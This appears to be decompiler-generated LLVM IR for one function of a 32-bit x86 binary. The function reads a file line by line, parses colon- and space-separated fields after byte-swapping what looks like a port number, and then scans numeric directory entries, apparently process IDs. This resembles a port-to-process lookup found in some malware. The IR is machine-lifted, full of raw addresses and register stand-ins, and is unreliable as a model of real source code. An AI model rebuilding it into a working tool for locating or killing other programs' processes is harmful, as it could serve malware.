  %stack_var_-4657 = alloca i32, align 4
  %stack_var_-8753 = alloca i32, align 4
  %stack_var_-8796 = alloca i8*, align 4
  %stack_var_-561 = alloca i8, align 1
  %stack_var_-8780 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804d5e0 = load i32, i32* @ebp, align 4
  %v0_804d5e1 = load i32, i32* @edi, align 4
  %v0_804d5e2 = load i32, i32* @esi, align 4
  %v0_804d5e3 = load i32, i32* @ebx, align 4
  store i32 %v0_804d5e3, i32* %stack_var_-16, align 4
  %v15_804d5e4 = ptrtoint i32* %stack_var_-8780 to i32
  %v2_804d5ea = ptrtoint i8* %stack_var_-561 to i32
  store i32 %v2_804d5ea, i32* @edi, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i8* %stack_var_-561, i8** %stack_var_-8796, align 4
  %v5_804d62d = call i32 @function_805200a(i8* nonnull %stack_var_-561, i32 0, i32 513)
  %v1_804d635 = trunc i32 %arg1 to i16
  %v2_804d635 = call i16 @llvm.bswap.i16(i16 %v1_804d635)
  %v3_804d635 = zext i16 %v2_804d635 to i32
  %v2_804d640 = ptrtoint i32* %stack_var_-8753 to i32
  store i32 %v2_804d640, i32* %eax.global-to-local, align 4
  store i32 %v3_804d635, i32* @ebx, align 4
  %tmp71 = bitcast i32* %stack_var_-8753 to i8*
  store i8* %tmp71, i8** %stack_var_-8796, align 4
  %v5_804d64b = call i32 @function_805200a(i8* %tmp71, i32 0, i32 4096)
  store i32 %v5_804d64b, i32* %eax.global-to-local, align 4
  %v2_804d65a = ptrtoint i32* %stack_var_-4657 to i32
  store i32 %v2_804d65a, i32* %edx.global-to-local, align 4
  %tmp72 = bitcast i32* %stack_var_-4657 to i8*
  store i8* %tmp72, i8** %stack_var_-8796, align 4
  %v5_804d662 = call i32 @function_805200a(i8* %tmp72, i32 0, i32 4096)
  %v2_804d66a = ptrtoint i8* %stack_var_-48 to i32
  store i32 %v2_804d66a, i32* %eax.global-to-local, align 4
  %v0_804d674 = load i32, i32* @ebx, align 4
  %v5_804d674 = inttoptr i32 %v0_804d674 to i8*
  store i8* %v5_804d674, i8** %stack_var_-8796, align 4
  %v4_804d675 = sext i32 %v0_804d674 to i64
  %v5_804d675 = call i32 @function_80518f0(i64 %v4_804d675, i32 16, i32 %v2_804d66a)
  store i32 %v5_804d675, i32* %eax.global-to-local, align 4
  store i32 %v2_804d66a, i32* %edx.global-to-local, align 4
  store i8* %stack_var_-48, i8** %stack_var_-8796, align 4
  %v3_804d683 = call i32 @function_80514e0(i8* nonnull %stack_var_-48)
  store i32 %v3_804d683, i32* %eax.global-to-local, align 4
  %v9_804d68b = icmp eq i32 %v3_804d683, 2
  br i1 %v9_804d68b, label %dec_label_pc_804dbb5, label %dec_label_pc_804d694

dec_label_pc_804d694:                             ; preds = %dec_label_pc_804d5e0, %dec_label_pc_804dbb5
  store i32 0, i32* @ebx, align 4
  store i8* inttoptr (i32 6 to i8*), i8** %stack_var_-8796, align 4
  %v3_804d69b = call i32 @function_8050be0(i8 6)
  store i32 %v3_804d69b, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 7 to i8*), i8** %stack_var_-8796, align 4
  %v3_804d6a7 = call i32 @function_8050be0(i8 7)
  store i32 %v3_804d6a7, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 9 to i8*), i8** %stack_var_-8796, align 4
  %v3_804d6b3 = call i32 @function_8050be0(i8 9)
  %v2_804d6b8 = load i8*, i8** %stack_var_-8796, align 4
  %v3_804d6b8 = ptrtoint i8* %v2_804d6b8 to i32
  store i32 %v3_804d6b8, i32* %eax.global-to-local, align 4
  store i32 16, i32* %edx.global-to-local, align 4
  store i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80543d0.20, i32 0, i32 0), i8** %stack_var_-8796, align 4
  %v4_804d6c1 = call i32 @function_8051b92(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_80543d0.20, i32 0, i32 0), i32 0)
  store i32 %v4_804d6c1, i32* @eax, align 4
  store i32 %v4_804d6c1, i32* @ebp, align 4
  %v10_804d6cb = icmp eq i32 %v4_804d6c1, -1
  br i1 %v10_804d6cb, label %dec_label_pc_804db4e, label %dec_label_pc_804d6d4.outer.preheader

dec_label_pc_804d6d4.outer.preheader:             ; preds = %dec_label_pc_804d694
  store i8* %stack_var_-561, i8** %stack_var_-8796, align 4
  %v4_804d6dc9095 = call i32 @function_8051700(i32 %v2_804d5ea, i32 512, i32 %v4_804d6c1)
  store i32 %v4_804d6dc9095, i32* %eax.global-to-local, align 4
  %v1_804d6e49196 = icmp eq i32 %v4_804d6dc9095, 0
  br i1 %v1_804d6e49196, label %dec_label_pc_804d80b.loopexit, label %dec_label_pc_804d6ec.lr.ph.lr.ph

dec_label_pc_804d6ec.lr.ph.lr.ph:                 ; preds = %dec_label_pc_804d6d4.outer.preheader
  %v2_804d718 = add i32 %v15_804d5e4, 8221
  %v2_804d744 = add i32 %v15_804d5e4, 8219
  br label %dec_label_pc_804d6ec.lr.ph

dec_label_pc_804d6ec:                             ; preds = %dec_label_pc_804d6ec.lr.ph, %dec_label_pc_804d6d4.backedge
  %v4_804d6dc92 = phi i32 [ %v4_804d6dc9098, %dec_label_pc_804d6ec.lr.ph ], [ %v4_804d6dc, %dec_label_pc_804d6d4.backedge ]
  %v3_804d6ec = load i8, i8* %stack_var_-561, align 1
  %v4_804d6ec = sext i8 %v3_804d6ec to i32
  %v7_804d6ec = and i32 %v4_804d6dc92, -256
  %v8_804d6ec = or i32 %v4_804d6ec, %v7_804d6ec
  store i32 %v8_804d6ec, i32* @eax, align 4
  %v4_804d6f3 = icmp eq i8 %v3_804d6ec, 0
  br i1 %v4_804d6f3, label %dec_label_pc_804db17, label %dec_label_pc_804d6fb

dec_label_pc_804d6fb:                             ; preds = %dec_label_pc_804d6ec
  store i32 0, i32* %edx.global-to-local, align 4
  %v10_804d6fd = icmp eq i8 %v3_804d6ec, 58
  br i1 %v10_804d6fd, label %dec_label_pc_804db17, label %dec_label_pc_804d705.preheader

dec_label_pc_804d705.preheader:                   ; preds = %dec_label_pc_804d6fb
  %v1_804d706.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804d705

dec_label_pc_804d705:                             ; preds = %dec_label_pc_804d705.preheader, %dec_label_pc_804d70d
  %v6_804d706 = phi i32 [ %v8_804d6ec, %dec_label_pc_804d705.preheader ], [ %v8_804d706, %dec_label_pc_804d70d ]
  %v0_804d705 = phi i32 [ 0, %dec_label_pc_804d705.preheader ], [ %v1_804d705, %dec_label_pc_804d70d ]
  %v1_804d705 = add i32 %v0_804d705, 1
  store i32 %v1_804d705, i32* %edx.global-to-local, align 4
  %v2_804d706 = add i32 %v1_804d705, %v1_804d706.pre
  %v3_804d706 = inttoptr i32 %v2_804d706 to i8*
  %v4_804d706 = load i8, i8* %v3_804d706, align 1
  %v5_804d706 = zext i8 %v4_804d706 to i32
  %v7_804d706 = and i32 %v6_804d706, -256
  %v8_804d706 = or i32 %v5_804d706, %v7_804d706
  store i32 %v8_804d706, i32* @eax, align 4
  %v4_804d709 = icmp eq i8 %v4_804d706, 0
  br i1 %v4_804d709, label %dec_label_pc_804d6d4.backedge, label %dec_label_pc_804d70d

dec_label_pc_804d70d:                             ; preds = %dec_label_pc_804d705
  %v10_804d70d = icmp eq i8 %v4_804d706, 58
  %v1_804d70f = icmp eq i1 %v10_804d70d, false
  br i1 %v1_804d70f, label %dec_label_pc_804d705, label %dec_label_pc_804d711

dec_label_pc_804d711:                             ; preds = %dec_label_pc_804d70d, %dec_label_pc_804db17
  %v1_804d72f = phi i32 [ 0, %dec_label_pc_804db17 ], [ %v1_804d705, %dec_label_pc_804d70d ]
  %v7_804d718 = phi i32 [ %v8_804d6ec, %dec_label_pc_804db17 ], [ %v8_804d706, %dec_label_pc_804d70d ]
  %v3_804d711 = trunc i32 %v7_804d718 to i8
  %v4_804d711 = icmp eq i8 %v3_804d711, 0
  br i1 %v4_804d711, label %dec_label_pc_804d6d4.backedge, label %dec_label_pc_804d715

dec_label_pc_804d6d4.backedge:                    ; preds = %dec_label_pc_804d705, %dec_label_pc_804d711, %dec_label_pc_804d744
  %v0_804d6d4.be = phi i32 [ %v7_804d718, %dec_label_pc_804d711 ], [ 0, %dec_label_pc_804d744 ], [ %v8_804d706, %dec_label_pc_804d705 ]
  store i8* %stack_var_-561, i8** %stack_var_-8796, align 4
  %v4_804d6dc = call i32 @function_8051700(i32 %v2_804d5ea, i32 512, i32 %v0_804d6d4.be)
  store i32 %v4_804d6dc, i32* %eax.global-to-local, align 4
  %v1_804d6e4 = icmp eq i32 %v4_804d6dc, 0
  br i1 %v1_804d6e4, label %dec_label_pc_804d80b.loopexit, label %dec_label_pc_804d6ec

dec_label_pc_804d715:                             ; preds = %dec_label_pc_804d711
  %v1_804d715 = add i32 %v1_804d72f, 2
  store i32 %v1_804d715, i32* @ecx, align 4
  %v3_804d718 = add i32 %v2_804d718, %v1_804d72f
  %v4_804d718 = inttoptr i32 %v3_804d718 to i8*
  %v5_804d718 = load i8, i8* %v4_804d718, align 1
  %v6_804d718 = zext i8 %v5_804d718 to i32
  %v8_804d718 = and i32 %v7_804d718, -256
  %v9_804d718 = or i32 %v6_804d718, %v8_804d718
  store i32 %v9_804d718, i32* %eax.global-to-local, align 4
  %v4_804d71f = icmp eq i8 %v5_804d718, 0
  br i1 %v4_804d71f, label %dec_label_pc_804d744, label %dec_label_pc_804d727

dec_label_pc_804d727:                             ; preds = %dec_label_pc_804d715
  %v7_804d727 = icmp eq i8 %v5_804d718, 32
  br i1 %v7_804d727, label %dec_label_pc_804d744, label %dec_label_pc_804d72f

dec_label_pc_804d72f:                             ; preds = %dec_label_pc_804d727
  %v0_804d72f = load i32, i32* @edi, align 4
  %v2_804d72f = add i32 %v0_804d72f, %v1_804d72f
  store i32 %v2_804d72f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d732

dec_label_pc_804d732:                             ; preds = %dec_label_pc_804d73a, %dec_label_pc_804d72f
  %v5_804d732 = phi i32 [ %v7_804d732, %dec_label_pc_804d73a ], [ %v1_804d72f, %dec_label_pc_804d72f ]
  %v0_804d735 = phi i32 [ %v1_804d735, %dec_label_pc_804d73a ], [ %v2_804d72f, %dec_label_pc_804d72f ]
  %v1_804d732 = add i32 %v0_804d735, 3
  %v2_804d732 = inttoptr i32 %v1_804d732 to i8*
  %v3_804d732 = load i8, i8* %v2_804d732, align 1
  %v4_804d732 = zext i8 %v3_804d732 to i32
  %v6_804d732 = and i32 %v5_804d732, -256
  %v7_804d732 = or i32 %v4_804d732, %v6_804d732
  store i32 %v7_804d732, i32* %edx.global-to-local, align 4
  %v1_804d735 = add i32 %v0_804d735, 1
  store i32 %v1_804d735, i32* %eax.global-to-local, align 4
  %v4_804d736 = icmp eq i8 %v3_804d732, 0
  br i1 %v4_804d736, label %dec_label_pc_804d73f, label %dec_label_pc_804d73a

dec_label_pc_804d73a:                             ; preds = %dec_label_pc_804d732
  %v7_804d73a = icmp eq i8 %v3_804d732, 32
  %v1_804d73d = icmp eq i1 %v7_804d73a, false
  br i1 %v1_804d73d, label %dec_label_pc_804d732, label %dec_label_pc_804d73f

dec_label_pc_804d73f:                             ; preds = %dec_label_pc_804d73a, %dec_label_pc_804d732
  %v2_804d73f = sub i32 %v1_804d735, %v0_804d72f
  store i32 %v2_804d73f, i32* %eax.global-to-local, align 4
  %v1_804d741 = add i32 %v2_804d73f, 2
  br label %dec_label_pc_804d744

dec_label_pc_804d744:                             ; preds = %dec_label_pc_804d715, %dec_label_pc_804d727, %dec_label_pc_804d73f
  %storemerge = phi i32 [ %v1_804d741, %dec_label_pc_804d73f ], [ %v1_804d715, %dec_label_pc_804d727 ], [ %v1_804d715, %dec_label_pc_804d715 ]
  store i32 %storemerge, i32* @esi, align 4
  %v3_804d744 = add i32 %v2_804d744, %storemerge
  %v4_804d744 = inttoptr i32 %v3_804d744 to i8*
  store i8 0, i8* %v4_804d744, align 1
  %v0_804d74f = load i32, i32* @edi, align 4
  %v1_804d74f = load i32, i32* @ecx, align 4
  %v2_804d74f = add i32 %v1_804d74f, %v0_804d74f
  store i32 %v2_804d74f, i32* @ebx, align 4
  %v5_804d752 = inttoptr i32 %v2_804d74f to i8*
  store i8* %v5_804d752, i8** %stack_var_-8796, align 4
  %v3_804d753 = call i32 @function_80514e0(i8* %v5_804d752)
  store i32 %v3_804d753, i32* %eax.global-to-local, align 4
  store i32 %v2_804d66a, i32* @edx, align 4
  %v0_804d764 = load i32, i32* @ebx, align 4
  %v5_804d764 = inttoptr i32 %v0_804d764 to i8*
  store i8* %v5_804d764, i8** %stack_var_-8796, align 4
  %v5_804d765 = call i32 @function_80517d0(i8* %v5_804d764, i32 %v3_804d753, i32 %v2_804d66a)
  %v1_804d76d = add i32 %v5_804d765, 1
  %v8_804d76d = icmp eq i32 %v1_804d76d, 0
  store i32 %v1_804d76d, i32* @eax, align 4
  br i1 %v8_804d76d, label %dec_label_pc_804d6d4.backedge, label %dec_label_pc_804d774

dec_label_pc_804d774:                             ; preds = %dec_label_pc_804d744
  %v0_804d774 = load i32, i32* @esi, align 4
  %v1_804d774 = add i32 %v0_804d774, 1
  %v0_804d777 = load i32, i32* @edi, align 4
  %v2_804d777 = add i32 %v0_804d777, %v0_804d774
  store i32 %v2_804d777, i32* %edx.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804d783.outer

dec_label_pc_804d783.outer:                       ; preds = %dec_label_pc_804db02, %dec_label_pc_804d774
  %v0_804daf830 = phi i32 [ %v1_804daf8, %dec_label_pc_804db02 ], [ 0, %dec_label_pc_804d774 ]
  %v0_804d78625 = phi i32 [ %v1_804d786, %dec_label_pc_804db02 ], [ %v1_804d774, %dec_label_pc_804d774 ]
  %v5_804d78324 = phi i32 [ %v7_804d783, %dec_label_pc_804db02 ], [ %v1_804d76d, %dec_label_pc_804d774 ]
  %v0_804d78322 = phi i32 [ %v1_804db08, %dec_label_pc_804db02 ], [ %v2_804d777, %dec_label_pc_804d774 ]
  %stack_var_-8769.1.ph = phi i8 [ %.stack_var_-8769.1, %dec_label_pc_804db02 ], [ 0, %dec_label_pc_804d774 ]
  br label %dec_label_pc_804d783

dec_label_pc_804d783:                             ; preds = %dec_label_pc_804d783.outer, %dec_label_pc_804d7a5
  %v0_804daf8 = phi i32 [ %v0_804daf830, %dec_label_pc_804d783.outer ], [ %v0_804d7a6, %dec_label_pc_804d7a5 ]
  %v0_804db10 = phi i32 [ 0, %dec_label_pc_804d783.outer ], [ %storemerge4, %dec_label_pc_804d7a5 ]
  %v0_804d786 = phi i32 [ %v0_804d78625, %dec_label_pc_804d783.outer ], [ %v1_804d786, %dec_label_pc_804d7a5 ]
  %v5_804d783 = phi i32 [ %v5_804d78324, %dec_label_pc_804d783.outer ], [ %v7_804d783, %dec_label_pc_804d7a5 ]
  %v0_804d7a5 = phi i32 [ %v0_804d78322, %dec_label_pc_804d783.outer ], [ %v1_804d7a5, %dec_label_pc_804d7a5 ]
  %v1_804d783 = add i32 %v0_804d7a5, 2
  %v2_804d783 = inttoptr i32 %v1_804d783 to i8*
  %v3_804d783 = load i8, i8* %v2_804d783, align 1
  %v4_804d783 = zext i8 %v3_804d783 to i32
  %v6_804d783 = and i32 %v5_804d783, -256
  %v7_804d783 = or i32 %v4_804d783, %v6_804d783
  store i32 %v7_804d783, i32* @eax, align 4
  %v1_804d786 = add i32 %v0_804d786, 1
  %v4_804d787 = icmp eq i8 %v3_804d783, 0
  br i1 %v4_804d787, label %dec_label_pc_804d7ab, label %dec_label_pc_804d78b

dec_label_pc_804d78b:                             ; preds = %dec_label_pc_804d783
  %v7_804d78b = icmp eq i8 %v3_804d783, 32
  br i1 %v7_804d78b, label %dec_label_pc_804db10, label %dec_label_pc_804d793

dec_label_pc_804d793:                             ; preds = %dec_label_pc_804d78b
  %v10_804d793 = icmp eq i8 %v3_804d783, 9
  br i1 %v10_804d793, label %dec_label_pc_804db10, label %dec_label_pc_804d79b

dec_label_pc_804d79b:                             ; preds = %dec_label_pc_804d793
  %v1_804d79b = trunc i32 %v0_804db10 to i8
  %v9_804d79b = icmp eq i8 %v1_804d79b, 1
  br i1 %v9_804d79b, label %dec_label_pc_804daf8, label %dec_label_pc_804d7a3

dec_label_pc_804d7a3:                             ; preds = %dec_label_pc_804daf8, %dec_label_pc_804d79b
  %v0_804d7a631 = phi i32 [ %v1_804daf8, %dec_label_pc_804daf8 ], [ %v0_804daf8, %dec_label_pc_804d79b ]
  br label %dec_label_pc_804d7a5

dec_label_pc_804d7a5:                             ; preds = %dec_label_pc_804db10, %dec_label_pc_804d7a3
  %v0_804d7a6 = phi i32 [ %v0_804d7a631, %dec_label_pc_804d7a3 ], [ %v0_804daf8, %dec_label_pc_804db10 ]
  %storemerge4 = phi i32 [ 0, %dec_label_pc_804d7a3 ], [ %v2_804db10, %dec_label_pc_804db10 ]
  store i32 %storemerge4, i32* @ebx, align 4
  %v1_804d7a5 = add i32 %v0_804d7a5, 1
  store i32 %v1_804d7a5, i32* %edx.global-to-local, align 4
  %v7_804d7a9 = icmp sgt i32 %v0_804d7a6, 6
  br i1 %v7_804d7a9, label %dec_label_pc_804d7ab, label %dec_label_pc_804d783

dec_label_pc_804d7ab:                             ; preds = %dec_label_pc_804d7a5, %dec_label_pc_804d783
  %v5_804d7ca35 = phi i32 [ %storemerge4, %dec_label_pc_804d7a5 ], [ %v0_804db10, %dec_label_pc_804d783 ]
  store i32 %v1_804d786, i32* %edx.global-to-local, align 4
  %v4_804d7ad = icmp eq i8 %stack_var_-8769.1.ph, 0
  br i1 %v4_804d7ad, label %dec_label_pc_804d6d4.outer.backedge, label %dec_label_pc_804d7b8

dec_label_pc_804d6d4.outer.backedge:              ; preds = %dec_label_pc_804d7ab, %dec_label_pc_804d7d8
  %v0_804d6d48.be = phi i32 [ %v3_804d7e7, %dec_label_pc_804d7d8 ], [ %v7_804d783, %dec_label_pc_804d7ab ]
  %stack_var_-8769.0.ph.be = phi i8 [ %stack_var_-8769.1.ph, %dec_label_pc_804d7d8 ], [ 0, %dec_label_pc_804d7ab ]
  store i8* %stack_var_-561, i8** %stack_var_-8796, align 4
  %v4_804d6dc90 = call i32 @function_8051700(i32 %v2_804d5ea, i32 512, i32 %v0_804d6d48.be)
  store i32 %v4_804d6dc90, i32* %eax.global-to-local, align 4
  %v1_804d6e491 = icmp eq i32 %v4_804d6dc90, 0
  br i1 %v1_804d6e491, label %dec_label_pc_804d80b.loopexit, label %dec_label_pc_804d6ec.lr.ph

dec_label_pc_804d6ec.lr.ph:                       ; preds = %dec_label_pc_804d6ec.lr.ph.lr.ph, %dec_label_pc_804d6d4.outer.backedge
  %v4_804d6dc9098 = phi i32 [ %v4_804d6dc9095, %dec_label_pc_804d6ec.lr.ph.lr.ph ], [ %v4_804d6dc90, %dec_label_pc_804d6d4.outer.backedge ]
  %stack_var_-8769.0.ph97 = phi i8 [ %tmp51, %dec_label_pc_804d6ec.lr.ph.lr.ph ], [ %stack_var_-8769.0.ph.be, %dec_label_pc_804d6d4.outer.backedge ]
  br label %dec_label_pc_804d6ec

dec_label_pc_804d7b8:                             ; preds = %dec_label_pc_804d7ab
  %v3_804d7b8 = add i32 %v1_804d786, %v2_804d744
  %v4_804d7b8 = inttoptr i32 %v3_804d7b8 to i8*
  %v5_804d7b8 = load i8, i8* %v4_804d7b8, align 1
  %v6_804d7b8 = zext i8 %v5_804d7b8 to i32
  %v9_804d7b8 = or i32 %v6_804d7b8, %v6_804d783
  store i32 %v9_804d7b8, i32* %eax.global-to-local, align 4
  %v4_804d7bf = icmp eq i8 %v5_804d7b8, 0
  br i1 %v4_804d7bf, label %dec_label_pc_804d7d8, label %dec_label_pc_804d7c3

dec_label_pc_804d7c3:                             ; preds = %dec_label_pc_804d7b8
  %v7_804d7c3 = icmp eq i8 %v5_804d7b8, 32
  br i1 %v7_804d7c3, label %dec_label_pc_804d7d8, label %dec_label_pc_804d7c7

dec_label_pc_804d7c7:                             ; preds = %dec_label_pc_804d7c3
  %v2_804d7c7 = add i32 %v1_804d786, %v0_804d777
  store i32 %v2_804d7c7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d7ca

dec_label_pc_804d7ca:                             ; preds = %dec_label_pc_804d7d3, %dec_label_pc_804d7c7
  %v0_804d7cd = phi i32 [ %v1_804d7cd, %dec_label_pc_804d7d3 ], [ %v1_804d786, %dec_label_pc_804d7c7 ]
  %v5_804d7ca = phi i32 [ %v7_804d7ca, %dec_label_pc_804d7d3 ], [ %v5_804d7ca35, %dec_label_pc_804d7c7 ]
  %v0_804d7ce = phi i32 [ %v1_804d7ca, %dec_label_pc_804d7d3 ], [ %v2_804d7c7, %dec_label_pc_804d7c7 ]
  %v1_804d7ca = add i32 %v0_804d7ce, 1
  %v2_804d7ca = inttoptr i32 %v1_804d7ca to i8*
  %v3_804d7ca = load i8, i8* %v2_804d7ca, align 1
  %v1_804d7cd = add i32 %v0_804d7cd, 1
  store i32 %v1_804d7ca, i32* %eax.global-to-local, align 4
  %v4_804d7cf = icmp eq i8 %v3_804d7ca, 0
  br i1 %v4_804d7cf, label %dec_label_pc_804d7d8, label %dec_label_pc_804d7d3

dec_label_pc_804d7d3:                             ; preds = %dec_label_pc_804d7ca
  %v4_804d7ca = zext i8 %v3_804d7ca to i32
  %v6_804d7ca = and i32 %v5_804d7ca, -256
  %v7_804d7ca = or i32 %v4_804d7ca, %v6_804d7ca
  %v7_804d7d3 = icmp eq i8 %v3_804d7ca, 32
  %v1_804d7d6 = icmp eq i1 %v7_804d7d3, false
  br i1 %v1_804d7d6, label %dec_label_pc_804d7ca, label %dec_label_pc_804d7d8

dec_label_pc_804d7d8:                             ; preds = %dec_label_pc_804d7d3, %dec_label_pc_804d7ca, %dec_label_pc_804d7c3, %dec_label_pc_804d7b8
  %v1_804d7d8 = phi i32 [ %v1_804d786, %dec_label_pc_804d7c3 ], [ %v1_804d786, %dec_label_pc_804d7b8 ], [ %v1_804d7cd, %dec_label_pc_804d7ca ], [ %v1_804d7cd, %dec_label_pc_804d7d3 ]
  %v3_804d7d8 = add i32 %v1_804d7d8, %v2_804d744
  %v4_804d7d8 = inttoptr i32 %v3_804d7d8 to i8*
  store i8 0, i8* %v4_804d7d8, align 1
  %v0_804d7e3 = load i32, i32* @edi, align 4
  %v1_804d7e3 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d7e3 = add i32 %v1_804d7e3, %v0_804d7e3
  store i32 %v2_804d7e3, i32* @ebx, align 4
  %v5_804d7e6 = inttoptr i32 %v2_804d7e3 to i8*
  store i8* %v5_804d7e6, i8** %stack_var_-8796, align 4
  %v3_804d7e7 = call i32 @function_80514e0(i8* %v5_804d7e6)
  store i32 %v3_804d7e7, i32* @eax, align 4
  %v1_804d7ef = add i32 %v3_804d7e7, -15
  %v6_804d7ef = sub i32 14, %v3_804d7e7
  %v7_804d7ef = and i32 %v6_804d7ef, %v3_804d7e7
  %v8_804d7ef = icmp slt i32 %v7_804d7ef, 0
  %v9_804d7ef = icmp eq i32 %v1_804d7ef, 0
  %v10_804d7ef = icmp slt i32 %v1_804d7ef, 0
  %v3_804d7f2 = icmp eq i1 %v10_804d7ef, %v8_804d7ef
  %v4_804d7f2 = icmp eq i1 %v9_804d7ef, false
  %v5_804d7f2 = and i1 %v4_804d7f2, %v3_804d7f2
  br i1 %v5_804d7f2, label %dec_label_pc_804d6d4.outer.backedge, label %dec_label_pc_804d7f8

dec_label_pc_804d7f8:                             ; preds = %dec_label_pc_804d7d8
  %v0_804d7fa = load i32, i32* @ebx, align 4
  %v2_804d7fb = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804d7fb, i32* %eax.global-to-local, align 4
  %tmp73 = bitcast i32* %stack_var_-32 to i8*
  store i8* %tmp73, i8** %stack_var_-8796, align 4
  %v4_804d803 = call i32 @function_8051500(i8* %tmp73, i32 %v0_804d7fa)
  store i32 %v4_804d803, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d80b

dec_label_pc_804d80b.loopexit:                    ; preds = %dec_label_pc_804d6d4.backedge, %dec_label_pc_804d6d4.outer.preheader, %dec_label_pc_804d6d4.outer.backedge
  %stack_var_-8769.0.ph.lcssa = phi i8 [ %tmp51, %dec_label_pc_804d6d4.outer.preheader ], [ %stack_var_-8769.0.ph.be, %dec_label_pc_804d6d4.outer.backedge ], [ %stack_var_-8769.0.ph97, %dec_label_pc_804d6d4.backedge ]
  %.pre = ptrtoint i32* %stack_var_-32 to i32
  %.pre46 = bitcast i32* %stack_var_-32 to i8*
  br label %dec_label_pc_804d80b

dec_label_pc_804d80b:                             ; preds = %dec_label_pc_804d80b.loopexit, %dec_label_pc_804d7f8
  %.pre-phi = phi i8* [ %.pre46, %dec_label_pc_804d80b.loopexit ], [ %tmp73, %dec_label_pc_804d7f8 ]
  %v2_804d815.pre-phi = phi i32 [ %.pre, %dec_label_pc_804d80b.loopexit ], [ %v2_804d7fb, %dec_label_pc_804d7f8 ]
  %stack_var_-8769.2 = phi i8 [ %stack_var_-8769.0.ph.lcssa, %dec_label_pc_804d80b.loopexit ], [ %stack_var_-8769.1.ph, %dec_label_pc_804d7f8 ]
  %v0_804d80e = load i32, i32* @ebp, align 4
  %v5_804d80e = inttoptr i32 %v0_804d80e to i8*
  store i8* %v5_804d80e, i8** %stack_var_-8796, align 4
  %v2_804d80f = call i32 @function_8051a81(i32 %v0_804d80e)
  %v2_804d814 = load i8*, i8** %stack_var_-8796, align 4
  %v3_804d814 = ptrtoint i8* %v2_804d814 to i32
  store i32 %v3_804d814, i32* %eax.global-to-local, align 4
  store i32 %v2_804d815.pre-phi, i32* %edx.global-to-local, align 4
  store i8* %.pre-phi, i8** %stack_var_-8796, align 4
  %v3_804d81d = call i32 @function_80514e0(i8* %.pre-phi)
  store i32 %v3_804d81d, i32* %eax.global-to-local, align 4
  %v1_804d825 = icmp eq i32 %v3_804d81d, 0
  br i1 %v1_804d825, label %dec_label_pc_804db27, label %dec_label_pc_804d82d

dec_label_pc_804d82d:                             ; preds = %dec_label_pc_804d80b
  store i8* inttoptr (i32 6 to i8*), i8** %stack_var_-8796, align 4
  %v4_804d833 = call i32 @function_8050b30(i32 6, i32* null)
  store i32 %v4_804d833, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v4_804d83a = inttoptr i32 %v4_804d833 to i8*
  store i8* %v4_804d83a, i8** %stack_var_-8796, align 4
  %v2_804d83d = call i32 @function_8051e44(i32 %v4_804d833)
  store i32 %v2_804d83d, i32* %eax.global-to-local, align 4
  store i32 %v2_804d83d, i32* %stack_var_-8780, align 4
  %v1_804d849 = icmp eq i32 %v2_804d83d, 0
  br i1 %v1_804d849, label %dec_label_pc_804db77, label %dec_label_pc_804d859

dec_label_pc_804d859:                             ; preds = %dec_label_pc_804d918, %dec_label_pc_804d88a, %dec_label_pc_804d87d, %dec_label_pc_804dbee, %dec_label_pc_804d82d
  %v0_804d859 = phi i32 [ %v15_804d5e4, %dec_label_pc_804d82d ], [ %v1_804dbf7, %dec_label_pc_804dbee ], [ %v1_804d866, %dec_label_pc_804d87d ], [ %v1_804d90e, %dec_label_pc_804d88a ], [ %v1_804d990, %dec_label_pc_804d918 ]
  %v2_804d85c = inttoptr i32 %v0_804d859 to i32*
  %v3_804d85c = load i32, i32* %v2_804d85c, align 4
  store i32 %v3_804d85c, i32* @ebx, align 4
  %v2_804d860 = add i32 %v0_804d859, -16
  %v3_804d860 = inttoptr i32 %v2_804d860 to i32*
  store i32 %v3_804d85c, i32* %v3_804d860, align 4
  %v0_804d861 = call i32 @function_8051f35()
  store i32 %v0_804d861, i32* @eax, align 4
  %v0_804d866 = load i32, i32* @esp, align 4
  %v1_804d866 = add i32 %v0_804d866, 16
  %v1_804d869 = icmp eq i32 %v0_804d861, 0
  br i1 %v1_804d869, label %dec_label_pc_804db62, label %dec_label_pc_804d871

dec_label_pc_804d871:                             ; preds = %dec_label_pc_804d859
  %v1_804d871 = add i32 %v0_804d866, 20
  %v2_804d871 = inttoptr i32 %v1_804d871 to i32*
  %v3_804d871 = load i32, i32* %v2_804d871, align 4
  %v1_804d875 = icmp eq i32 %v3_804d871, 0
  %v1_804d877 = icmp eq i1 %v1_804d875, false
  br i1 %v1_804d877, label %dec_label_pc_804db62, label %dec_label_pc_804d87d

dec_label_pc_804d87d:                             ; preds = %dec_label_pc_804d871
  %v1_804d87d = add i32 %v0_804d861, 11
  store i32 %v1_804d87d, i32* @edi, align 4
  %v2_804d880 = inttoptr i32 %v1_804d87d to i8*
  %v3_804d880 = load i8, i8* %v2_804d880, align 1
  %v4_804d880 = zext i8 %v3_804d880 to i32
  %v6_804d880 = and i32 %v0_804d861, -256
  %v7_804d880 = or i32 %v4_804d880, %v6_804d880
  %v1_804d883 = add i32 %v7_804d880, -48
  %v8_804d883 = trunc i32 %v1_804d883 to i8
  store i32 %v1_804d883, i32* %eax.global-to-local, align 4
  %v8_804d888 = icmp ugt i8 %v8_804d883, 9
  br i1 %v8_804d888, label %dec_label_pc_804d859, label %dec_label_pc_804d88a

dec_label_pc_804d88a:                             ; preds = %dec_label_pc_804d87d
  %v2_804d88a = add i32 %v0_804d866, 12
  %v3_804d88a = inttoptr i32 %v2_804d88a to i32*
  store i32 %v1_804d883, i32* %v3_804d88a, align 4
  %v0_804d88b = load i32, i32* %eax.global-to-local, align 4
  %v2_804d88b = add i32 %v0_804d866, 8
  %v3_804d88b = inttoptr i32 %v2_804d88b to i32*
  store i32 %v0_804d88b, i32* %v3_804d88b, align 4
